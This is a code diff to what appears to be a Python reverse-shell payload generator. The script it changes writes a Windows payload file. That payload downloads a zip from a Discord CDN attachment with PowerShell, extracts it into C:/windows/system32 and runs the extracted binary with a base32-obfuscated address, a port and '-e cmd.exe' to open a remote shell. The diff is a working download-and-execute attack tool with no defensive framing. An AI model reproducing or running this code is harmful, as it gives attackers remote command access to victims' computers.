@@ -39,7 +39,7 @@ def frame():
         encodedBytes = base64.b32encode(bytearray(cpl, 'ascii')).decode('utf-8')
         # write and close file
         fichier = open("winpayload.py", "w")
-        towrite = "import base64,os;os.system('@echo off');os.system('powershell Invoke-WebRequest https://cdn.discordapp.com/attachments/769931868488597514/889144849461313616/sc.zip -O sc.zip');os.system('tar -xf sc.zip');code_cry = '"+encodedBytes+"';ash = 'ascii';utf ='utf-8';os.system('sc.exe '+base64.b32decode(bytearray(code_cry, ash)).decode(utf)+' "+port+" -e cmd.exe');"
+        towrite = "import base64,os;os.system('@echo off');os.system('');os.system('powershell Invoke-WebRequest https://cdn.discordapp.com/attachments/769931868488597514/889144849461313616/sc.zip -O C:/windows/system32/sc.zip');os.system('tar -xf C:/windows/system32/sc.zip');code_cry = '"+encodedBytes+"';ash = 'ascii';utf ='utf-8';os.system('C:/windows/system32/sc.exe '+base64.b32decode(bytearray(code_cry, ash)).decode(utf)+' "+port+" -e cmd.exe');"
         fichier.write(str(towrite))
         fichier.close()
         print(colored("Payload generated !".center(60),'red'))
